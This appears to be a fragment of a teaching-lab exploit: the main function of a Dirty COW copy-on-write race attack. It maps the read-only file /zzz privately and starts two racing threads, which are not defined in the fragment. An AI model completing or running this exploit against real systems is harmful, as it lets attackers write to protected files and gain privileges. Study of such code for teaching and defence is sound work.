/* cow_attack.c (the main thread) */
#include <sys/mman.h>
#include <fcntl.h>
#include <pthread.h>
#include <sys/stat.h>
#include <string.h>
#include <unistd.h>
void *map;
int main(int argc, char *argv[]) {
 pthread_t pth1,pth2;
 struct stat st;
 int file_size;
 // Open the target file in the read-only mode.
 int f=open("/zzz", O_RDONLY);

 // Map the file to COW memory using MAP_PRIVATE.
 fstat(f, &st);
 file_size = st.st_size;
 map=mmap(NULL, file_size, PROT_READ, MAP_PRIVATE, f, 0);

 // Find the position of the target area
 char *position = strstr(map, "222222");

 // We have to do the attack using two threads.
 pthread_create(&pth1, NULL, madviseThread, (void *)file_size);
 pthread_create(&pth2, NULL, writeThread, position);

 // Wait for the threads to finish.
 pthread_join(pth1, NULL);
 pthread_join(pth2, NULL);

 return 0;
}